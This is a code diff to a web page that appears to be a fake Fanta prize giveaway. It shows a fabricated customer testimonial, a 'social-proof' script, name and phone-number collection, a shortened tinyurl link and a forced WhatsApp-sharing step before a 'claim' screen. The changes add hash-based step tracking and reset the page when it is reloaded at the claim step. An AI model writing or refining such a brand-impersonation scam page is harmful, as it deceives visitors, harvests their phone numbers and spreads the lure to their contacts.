@@ -245,6 +245,16 @@ Thank you very much Fanta! I received the prize today and it arrived immediately
     <script src="prizes.js"></script>
     <script src="social-proof.js"></script>
     <script>
+        // Hash navigation and reload protection
+        (function() {
+            const currentHash = window.location.hash;
+            if (currentHash === "#3") {
+                // If user reloads on #3, reset to home
+                window.location.hash = "";
+                window.location.reload();
+            }
+        })();
+
         var errorname = "Please enter the name correctly!",
             errornumber = "Please enter your number correctly, example 05xxxxxxx",
             link = "https://tinyurl.com/fanta-mz",
@@ -344,14 +354,15 @@ $(".yes").click(function () {
                 i = 50;
             }, 1000);
         }
-        if (i >= 100) {
-            clearInterval(interval);
-            $("#load").fadeOut(0);
-            $("#check").fadeIn(0);
-            setTimeout(function () {
-                $("#checking").fadeOut(0);
-                $("#share").fadeIn(1000);
-                $(".display-name").html($("#name").val());
+                if (i >= 100) {
+                    clearInterval(interval);
+                    $("#load").fadeOut(0);
+                    $("#check").fadeIn(0);
+                    setTimeout(function () {
+                        $("#checking").fadeOut(0);
+                        $("#share").fadeIn(1000);
+                        window.location.hash = "2";
+                        $(".display-name").html($("#name").val());
                 
                 // Get prize from query string or cookie
                 const urlParams = new URLSearchParams(window.location.search);
@@ -387,7 +398,7 @@ $(".no").click(function () {
 
 <script type="text/javascript">  
 var swidth = localStorage.getItem(saved);
-if (swidth !== null) {
+if (swidth !== null && window.location.hash === "#2") {
     var width = swidth * 1;
     $(".welcome").fadeOut(0);
     $(".step1").fadeOut(0);
@@ -421,6 +432,11 @@ if (swidth !== null) {
         if (claimPrizeImg) claimPrizeImg.src = prizeData.image;
     }
 } else {
+    // If we have a hash but it's not #2, or no hash, ensure we are at step 1 or 2 appropriately
+    // But per requirements, #3 reload should go back to start.
+    if (window.location.hash === "#2" || window.location.hash === "#3") {
+        window.location.hash = "";
+    }
     var width = 0;
 }
 $("#whatsapp").click(function () {
@@ -455,6 +471,7 @@ $("#whatsapp").click(function () {
     } else {
         $("#share").fadeOut(0);
         $("#claim").fadeIn(1000);
+        window.location.hash = "3";
     }
     localStorage.setItem(saved, width);
     setTimeout(function () {
